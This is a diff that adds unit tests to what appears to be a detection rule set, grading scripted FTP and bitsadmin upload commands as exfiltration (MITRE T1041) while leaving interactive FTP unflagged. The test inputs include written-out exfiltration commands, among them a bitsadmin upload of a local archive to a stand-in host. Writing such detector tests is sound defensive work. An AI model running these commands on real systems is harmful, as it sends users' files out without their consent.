@@ -257,6 +257,19 @@ describe("tradecraftRules — weak (Medium) dual-use tooling", () => {
   });
 });
 
+describe("tradecraftRules — scripted FTP / BITS upload exfil (#2090)", () => {
+  it("grades scripted ftp -s: and bitsadmin /upload as weak T1041", () => {
+    const f = sig("ftp.exe -v -s:ftp.txt", "ftp.exe");
+    expect(f?.weight).toBe("weak");
+    expect(f?.mitre).toContain("T1041");
+    expect(sig("bitsadmin /transfer j /upload https://x.example/u C:\\a.7z")?.mitre).toContain("T1041");
+  });
+
+  it("does not flag interactive ftp", () => {
+    expect(sig("ftp.exe 203.0.113.9", "ftp.exe")?.mitre ?? []).not.toContain("T1041");
+  });
+});
+
 describe("tradecraftRules — access-token manipulation and coercion privilege escalation", () => {
   it("flags WinPwn's Add-Type AdjPriv token helper as strong T1134.001", () => {
     for (const cmd of [
